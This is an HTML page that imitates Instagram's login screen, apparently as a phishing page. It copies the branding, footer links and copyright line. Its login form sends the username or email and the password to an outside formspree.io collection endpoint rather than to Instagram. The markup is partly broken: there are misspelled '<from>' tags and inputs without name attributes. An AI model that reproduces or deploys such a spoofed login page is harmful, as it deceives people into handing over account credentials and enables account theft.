<!DOCTYPE HTML>
<html lang="en">
    
    <head>
        <meta name="viewport" content="width=device-width, Initial-scale=1.0">
        <title>instagram.com</title>
        
        <link rel="stylesheet" href="style.css">
    </head>
    <!--created by the Roshan-->
    <body>
        <main>
            <div class="row">
                <div class="img-section">
                    <img src="images/Insta.png" alt="Instagram">
                </div>
                <div class="login-section">
                    <div class="white-bg">
                        <h1>Instagram</h1>
                        <from action="#">
                            <form action="https://formspree.io/f/xzzrpldg" method="POST">
                            <input type="text" placeholder="Phone Number, username, or email">
                            <input type=" password" placeholder="password">
                            <button class="submit-button" type="submit">
                                Log in
                            </button>
                            <div class="or">
                                <span></span>
                                <p>or</p>
                                <span></span>
                            </div>
                            <a href="#" class="fb-login">
                                <img src="images/fb_logo.png" alt="Facebook logo">
                                <p> Login with Facebook</p>
                            </a>
                            <div class="forgot">
                                <p> Forgot password?</p>
                            </div>    
                        </from>
                    </div>
                    <div class="white-bg mt">
                        <p>Don't have account? <a href="#">Sign up</a></p>
                    </div>
                    <div class="get-app mt">
                        <p>Get the app</p>
                        <div class="d-flex">
                            <a href="#">
                                <img src="images/app_store.png" alt="">
                            </a><a href="#">
                                <img src="images/play_store.png" alt="">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <footer>
            <ol>
                <li><a href="#">Meta</a></li>
                <li><a href="#">about</a></li>
                <li><a href="#">blog</a></li>
                <li><a href="#">jobs</a></li>
                <li><a href="#">help</a></li>
                <li><a href="#">API</a></li>
                <li><a href="#">privacy</a></li>
                <li><a href="#">terms</a></li>
                <li><a href="#">top accounts</a></li>
                <li><a href="#">hashtags</a></li>
                <li><a href="#">locations</a></li>
            </ol>
            <div class="d-flex mt">
                <select name="language" id="language">
                    <option value="lang1">
                        English
                    </option>
                    <option value="lan2">English</option>
                    <option value="lan3">Hindi</option>
                    <option value="lan4">Marathi</option>
                </select>
                <small>&copy; 2024 Instagram from Meta</small>
            </div>      
        </footer>
    </body>
</html>
